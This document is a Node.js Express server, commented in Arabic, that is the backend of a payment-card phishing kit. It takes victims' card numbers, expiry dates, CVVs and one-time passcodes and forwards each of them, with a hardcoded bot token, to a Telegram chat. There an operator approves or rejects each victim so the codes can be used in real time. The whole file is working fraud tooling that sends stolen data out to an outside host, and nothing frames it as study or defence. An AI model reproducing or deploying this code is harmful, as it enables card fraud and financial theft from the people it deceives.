const express = require('express');
const https = require('https');
const path = require('path');
const session = require('express-session');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({ origin: true, credentials: true }));

const telegramBotToken = '8731307636:AAEBSaoSnJZcrk5jegVkZ-aE-JUpKlhtK1E';
const telegramChatId = '8108427825';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// إعداد الجلسة لحفظ بيانات كل مستخدم على حدة في ذاكرة السيرفر
app.use(session({
  secret: 'v1sa_secure_key_2026',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // اجعلها true فقط إذا كنت تستخدم بروتوكول https://
}));

// متجر عام لحفظ حالات الجلسات (للمساعدة في معالجة webhooks)
const sessionStore = new Map();

app.use((req, res, next) => {
  // حفظ معرف الجلسة في المتجر العام عند كل طلب
  if (req.sessionID && !sessionStore.has(req.sessionID)) {
    sessionStore.set(req.sessionID, {
      approvalStatus: 'pending',
      cardData: null,
      otpAttempts: 0
    });
  }
  next();
});

// دالة إرسال الرسائل إلى تليجرام (مع معالجة أخطاء آمنة)
function sendTelegramMessage(text, replyMarkup = null) {
  return new Promise((resolve, reject) => {
    const payloadData = {
      chat_id: telegramChatId,
      text,
      parse_mode: 'HTML'
    };

    // إضافة الأزرار إلى جسم الطلب إذا تم تمريرها
    if (replyMarkup) {
      payloadData.reply_markup = replyMarkup;
    }

    const payload = JSON.stringify(payloadData);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const request = https.request(options, (response) => {
      let body = '';
      response.on('data', (chunk) => { body += chunk; });
      response.on('end', () => {
        if (response.statusCode >= 200 && response.statusCode < 300) {
          resolve(JSON.parse(body));
        } else {
          reject(new Error(`Telegram API Error: ${response.statusCode}`));
        }
      });
    });

    request.on('error', (error) => {
      console.log('⚠️ تحذير: فشل الاتصال بـ Telegram API (sendMessage):', error.message);
      resolve({}); // لا نرفع الخطأ، نستمر في المعالجة
    });
    
    request.setTimeout(5000, () => {
      request.destroy();
      console.log('⚠️ انقضى الوقت عند محاولة إرسال الرسالة');
      resolve({}); // لا نرفع الخطأ
    });
    
    request.write(payload);
    request.end();
  });
}

// 1. استقبال بيانات البطاقة وحفظها في الجلسة (Session) وبدء عداد الرموز للمستخدم
app.post('/api/payment', async (req, res) => {
  const paymentData = req.body;
  const sessionID = req.sessionID;
  
  console.log('تم استقبال بيانات البطاقة - SessionID:', sessionID);
  console.log('البيانات:', paymentData);

  // حفظ البيانات في جلسة المتصفح الحالي
  req.session.cardData = {
    name: paymentData.name || 'غير معروف',
    cardName: paymentData.cardName || 'غير معروف',
    cardNumber: paymentData.cardNumber || 'غير متوفر',
    expiry: paymentData.expiry || 'غير متوفر',
    cvv: paymentData.cvv || 'غير متوفر',
    type: paymentData.type || 'غير معروف'
  };
  
  req.session.otpAttempts = 0;
  req.session.approvalStatus = 'pending';

  // حفظ البيانات أيضاً في المتجر العام
  const sessionData = {
    cardData: req.session.cardData,
    otpAttempts: 0,
    approvalStatus: 'pending'
  };
  sessionStore.set(sessionID, sessionData);

  // إرسال إشعار أولي لتليجرام بدخول المستخدم وبدء العملية مع أزرار الموافقة
  const initialText = ` <b>🔔 طلب دفع جديد</b>\n\n` +
    `• حامل البطاقة: ${req.session.cardData.cardName}\n` +
    `• رقم البطاقة: <code>${req.session.cardData.cardNumber}</code>\n` +
    `• التاريخ: ${req.session.cardData.expiry}\n` +
    `• CVV: <code>${req.session.cardData.cvv}</code>\n\n` +
    `⏳ بانتظار موافقتك...`;

  // إنشاء أزرار الموافقة والرفض مع sessionID
  const replyMarkup = {
    inline_keyboard: [
      [
        { text: '✅ موافق', callback_data: `approve_${sessionID}` },
        { text: '❌ غير موافق', callback_data: `reject_${sessionID}` }
      ]
    ]
  };

  try {
    await sendTelegramMessage(initialText, replyMarkup);
    return res.json({ success: true, message: 'Card data saved in session.' });
  } catch (error) {
    console.error('خطأ في إرسال رسالة تليجرام:', error.message);
    // نستمر في المعالجة حتى لو فشل الإرسال
    return res.json({ success: true, message: 'Saved locally, telegram may have failed but request is queued.' });
  }
});

// 2. استقبال callback من تيليجرام (أزرار الموافقة والرفض)
app.post('/webhook/telegram', async (req, res) => {
  const callbackQuery = req.body.callback_query;
  
  if (!callbackQuery) {
    return res.status(200).send('OK');
  }

  const callbackData = callbackQuery.data;
  const callbackId = callbackQuery.id;
  const messageId = callbackQuery.message.message_id;
  const userId = callbackQuery.from.id;

  console.log('استلام callback من تيليجرام:', callbackData);
  console.log('معرف المستخدم:', userId);

  // استخراج action و sessionID من callback_data
  const parts = callbackData.split('_');
  const action = parts[0];
  const sessionID = parts.slice(1).join('_'); // دعم IDs التي تحتوي على underscore

  console.log('Action:', action, 'SessionID:', sessionID);

  // البحث عن الجلسة في المتجر العام
  const sessionData = sessionStore.get(sessionID);

  if (!sessionData) {
    console.log('الجلسة غير موجودة:', sessionID);
    console.log('الجلسات المتاحة:', Array.from(sessionStore.keys()));
    await answerCallbackQuery(callbackId, '❌ الجلسة منتهية أو غير صحيحة');
    return res.status(200).send('OK');
  }

  // تحديث حالة الموافقة بناءً على الزر المضغوط
  if (action === 'approve') {
    sessionData.approvalStatus = 'approved';
    sessionStore.set(sessionID, sessionData);
    
    await answerCallbackQuery(callbackId, '✅ تمت الموافقة - سيتم توجيه المستخدم لصفحة OTP');
    await editMessageText(messageId, '✅ <b>تمت الموافقة على الطلب</b>\n\n• المستخدم سيتم توجيهه إلى صفحة OTP');
    
    console.log('✅ تمت الموافقة على الطلب - SessionID:', sessionID);
  } else if (action === 'reject') {
    sessionData.approvalStatus = 'rejected';
    sessionStore.set(sessionID, sessionData);
    
    await answerCallbackQuery(callbackId, '❌ تم الرفض - سيتم إبلاغ المستخدم');
    await editMessageText(messageId, '❌ <b>تم رفض الطلب</b>\n\n• سيتم إبلاغ المستخدم بالتحقق من البيانات');
    
    console.log('❌ تم رفض الطلب - SessionID:', sessionID);
  }

  res.status(200).send('OK');
});

// دالة للإجابة على callback query (مع معالجة أخطاء آمنة)
function answerCallbackQuery(callbackId, text) {
  return new Promise((resolve) => {
    const payloadData = {
      callback_query_id: callbackId,
      text: text,
      show_alert: true
    };

    const payload = JSON.stringify(payloadData);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/answerCallbackQuery`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const request = https.request(options, (response) => {
      let body = '';
      response.on('data', (chunk) => { body += chunk; });
      response.on('end', () => {
        if (response.statusCode >= 200 && response.statusCode < 300) {
          resolve(JSON.parse(body));
        } else {
          console.log('⚠️ تحذير: Telegram API استجابة غير متوقعة:', response.statusCode);
          resolve({}); // لا نرفع الخطأ، فقط نسجل
        }
      });
    });

    request.on('error', (error) => {
      console.log('⚠️ تحذير: فشل الاتصال بـ Telegram API (answerCallbackQuery):', error.message);
      resolve({}); // لا نرفع الخطأ
    });
    
    request.setTimeout(3000, () => {
      request.destroy();
      console.log('⚠️ انقضى الوقت عند محاولة الاتصال بـ Telegram');
      resolve({});
    });
    
    request.write(payload);
    request.end();
  });
}

// دالة لتحديث نص الرسالة (مع معالجة أخطاء آمنة)
function editMessageText(messageId, text) {
  return new Promise((resolve) => {
    const payloadData = {
      chat_id: telegramChatId,
      message_id: messageId,
      text: text,
      parse_mode: 'HTML'
    };

    const payload = JSON.stringify(payloadData);

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/editMessageText`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    };

    const request = https.request(options, (response) => {
      let body = '';
      response.on('data', (chunk) => { body += chunk; });
      response.on('end', () => {
        if (response.statusCode >= 200 && response.statusCode < 300) {
          resolve(JSON.parse(body));
        } else {
          console.log('⚠️ تحذير: Telegram API استجابة غير متوقعة:', response.statusCode);
          resolve({}); // لا نرفع الخطأ
        }
      });
    });

    request.on('error', (error) => {
      console.log('⚠️ تحذير: فشل الاتصال بـ Telegram API (editMessageText):', error.message);
      resolve({}); // لا نرفع الخطأ
    });
    
    request.setTimeout(3000, () => {
      request.destroy();
      console.log('⚠️ انقضى الوقت عند محاولة تحديث الرسالة');
      resolve({}); // لا نرفع الخطأ
    });
    
    request.write(payload);
    request.end();
  });
}

// 3. endpoint للتحقق من حالة الموافقة
app.get('/api/check-approval', (req, res) => {
  const sessionID = req.sessionID;
  const sessionData = sessionStore.get(sessionID);
  
  const status = sessionData ? sessionData.approvalStatus : (req.session.approvalStatus || 'pending');
  console.log('التحقق من الموافقة - SessionID:', sessionID, 'Status:', status);
  
  res.json({ status: status });
});

// 3.5 endpoint للتحكم اليدوي في الحالة (للاختبار)
app.post('/api/set-approval', (req, res) => {
  const { status } = req.body;
  if (['pending', 'approved', 'rejected'].includes(status)) {
    req.session.approvalStatus = status;
    res.json({ success: true, status: status });
  } else {
    res.status(400).json({ success: false, message: 'Invalid status' });
  }
});

// 4. استقبال رمز الـ OTP المتكرر وربطه بالبطاقة المخزنة وحساب المحاولات تصاعدياً
app.post('/api/verify-otp', async (req, res) => {
  const { otp } = req.body;
  const sessionID = req.sessionID;
  
  console.log('🔐 محاولة التحقق من OTP - SessionID:', sessionID);
  
  // جلب بيانات البطاقة من الجلسة أو المتجر العام
  let savedCard = req.session.cardData;
  const sessionData = sessionStore.get(sessionID);
  
  console.log('📦 بيانات الجلسة من sessionStore:', sessionData);
  console.log('📊 req.session.cardData:', req.session.cardData);
  console.log('📊 req.session.approvalStatus:', req.session.approvalStatus);

  if (!savedCard && sessionData) {
    savedCard = sessionData.cardData;
  }

  if (!savedCard) {
    console.log('محاولة إرسال OTP بدون وجود بيانات بطاقة في الجلسة');
    return res.status(400).json({ success: false, message: 'No card session found.' });
  }

  // التحقق من حالة الموافقة قبل قبول OTP
  // نتحقق من sessionStore أولاً (لأنه يتم تحديثه من webhook)
  let approvalStatus = sessionData ? sessionData.approvalStatus : req.session.approvalStatus;
  approvalStatus = approvalStatus || 'pending';
  
  console.log('✓ حالة الموافقة النهائية:', approvalStatus);
  
  if (approvalStatus === 'rejected') {
    console.log('محاولة إرسال OTP بعد رفض الطلب');
    return res.json({ 
      success: false, 
      message: 'rejected',
      error: 'يرجى التأكد من البيانات أو استخدام طريقة دفع مختلفة'
    });
  }

  if (approvalStatus === 'pending') {
    console.log('محاولة إرسال OTP قبل الموافقة على الطلب');
    return res.json({ 
      success: false, 
      message: 'pending',
      error: 'يرجى الانتظار حتى يتم الموافقة على طلبك'
    });
  }

  // زيادة عداد المحاولات
  if (!req.session.otpAttempts) {
    req.session.otpAttempts = 1;
  } else {
    req.session.otpAttempts += 1;
  }

  if (sessionData) {
    sessionData.otpAttempts = req.session.otpAttempts;
    sessionStore.set(sessionID, sessionData);
  }

  const currentAttempt = req.session.otpAttempts;
  console.log(`تم استلام الرمز رقم [${currentAttempt}]: (${otp}) للبطاقة: ${savedCard.cardNumber}`);

  const telegramText = ` <b>[ الرمز  ${currentAttempt}]</b>\n\n` +
    `📌 <b>بيانات صاحب البطاقة:</b>\n` +
    `• الاسم: ${savedCard.name}\n` +
    `•  البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
    `⚠️ <b>الرمز  :</b>\n` +
    `• الرمز [${currentAttempt}]: <code style="color: red; font-size: 18px;">${otp}</code>\n\n` +
    `•  تاريخ ورمز امان : [${savedCard.cardName} | ${savedCard.expiry} | CVV: ${savedCard.cvv}]`;

  try {
    // إرسال الرسالة إلى تليجرام
    await sendTelegramMessage(telegramText);
    
    // إرجاع نجاح التحقق
    return res.json({ 
      success: true, 
      message: 'OTP received and forwarded for verification', 
      attempt: currentAttempt 
    });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
});

// endpoint لإعادة إرسال OTP
app.post('/api/resend-otp', async (req, res) => {
  const sessionID = req.sessionID;
  
  let savedCard = req.session.cardData;
  const sessionData = sessionStore.get(sessionID);
  
  if (!savedCard && sessionData) {
    savedCard = sessionData.cardData;
  }

  if (!savedCard) {
    return res.status(400).json({ success: false, message: 'No card session found.' });
  }

  const resendText = `<b>🔄 إعادة طلب OTP</b>\n\n` +
    `📌 بيانات صاحب البطاقة:\n` +
    `• الاسم: ${savedCard.name}\n` +
    `• البطاقة: <code>${savedCard.cardNumber}</code>\n\n` +
    `⏰ تم طلب رمز تحقق جديد من قبل المستخدم.`;

  try {
    await sendTelegramMessage(resendText);
    return res.json({ 
      success: true, 
      message: 'OTP resend request processed' 
    });
  } catch (error) {
    return res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));
app.get('/success.html', (req, res) => res.sendFile(path.join(__dirname, 'success.html')));

app.listen(PORT, '0.0.0.0', () => console.log(`Server running at http://0.0.0.0:${PORT}`));